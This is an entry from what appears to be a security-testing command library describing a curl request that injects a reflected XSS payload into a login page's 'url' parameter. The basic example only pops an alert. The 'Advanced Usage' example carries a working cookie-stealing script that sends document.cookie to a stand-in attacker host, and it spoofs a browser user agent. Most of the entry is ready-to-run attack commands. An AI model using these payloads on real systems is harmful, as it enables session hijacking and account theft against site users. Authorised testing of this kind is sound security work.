---
id: cmd-uuid-1390131
data: >-
  curl
  "http://target.example.com/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E"
  -v
tags:
  - xss
  - web
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:21.014Z'
verified: false
validated: true
submitted: true
---
# curl-access-payload-url

## Command

```bash
curl "http://target.example.com/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E" -v
```

## Description

This command uses curl to send an HTTP GET request to a vulnerable login endpoint, injecting a URL-encoded JavaScript payload into the 'url' parameter to test for reflected XSS. It helps verify if the parameter is unsanitized by checking if the payload executes in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target endpoint with encoded payload in 'url' parameter | Yes |
| -v, --verbose | Enable verbose output to see request/response details | No |
| -A, --user-agent | Set a browser-like user agent to mimic real access | No |
| --output | Save response to a file for offline inspection | No |

## Examples

### Basic Usage

```bash
curl "http://target/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E" -v
```

### Advanced Usage

```bash
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "http://target/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Edocument.location='http://attacker.com/steal?cookie='+document.cookie%3C/ScRiPt%3E" --output xss_response.html
```

## Expected Output

Verbose curl output showing the HTTP request headers, followed by the server response containing the reflected payload in the HTML body. Look for the decoded script tag in the response; when viewed in a browser, it should execute (e.g., alert popup). No errors indicate successful reflection.

## Related

- [[Related Procedure|procedures/Inject-Malicious-Payload-into-Login-URL-Parameter]]
